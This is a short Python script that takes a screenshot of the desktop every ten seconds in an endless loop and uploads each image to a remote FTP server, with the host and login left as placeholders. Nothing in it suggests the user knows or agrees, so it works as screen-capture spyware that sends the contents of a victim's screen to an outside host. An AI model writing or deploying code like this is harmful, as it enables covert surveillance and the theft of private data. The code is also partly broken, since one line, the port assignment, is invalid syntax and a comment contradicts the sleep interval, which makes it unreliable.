import os
import time
from PIL import ImageGrab
import ftplib

def capture_screenshot():
    """Capture a screenshot and save it as a file."""
    screenshot = ImageGrab.grab()
    screenshot.save("screenshot.png")

def upload_to_ftp(file_path, ftp_host, ftp_user, ftp_pass, ftp_dir):
    """Upload a file to an FTP server."""
    try:
        ftp = ftplib.FTP(ftp_host)
        ftp.login(user=ftp_user, passwd=ftp_pass)
        ftp.cwd(ftp_dir)
        with open(file_path, "rb") as file:
            ftp.storbinary(f"STOR {os.path.basename(file_path)}", file)
        ftp.quit()
        print(f"File {file_path} uploaded successfully.")
    except Exception as e:
        print(f"Error uploading file: {e}")

if __name__ == "__main__":
    ftp_host = "your_host_IP"
    ftp_user = "your_ftp_user_name "
    ftp_port = port you want to litsen   
    ftp_pass = "your_ftp_password"
    ftp_dir = "/"

    while True:
        capture_screenshot()
        upload_to_ftp("screenshot.png", ftp_host, ftp_user, ftp_pass, ftp_dir)
        time.sleep(10)  # Wait for 60 seconds before capturing the next screenshot  
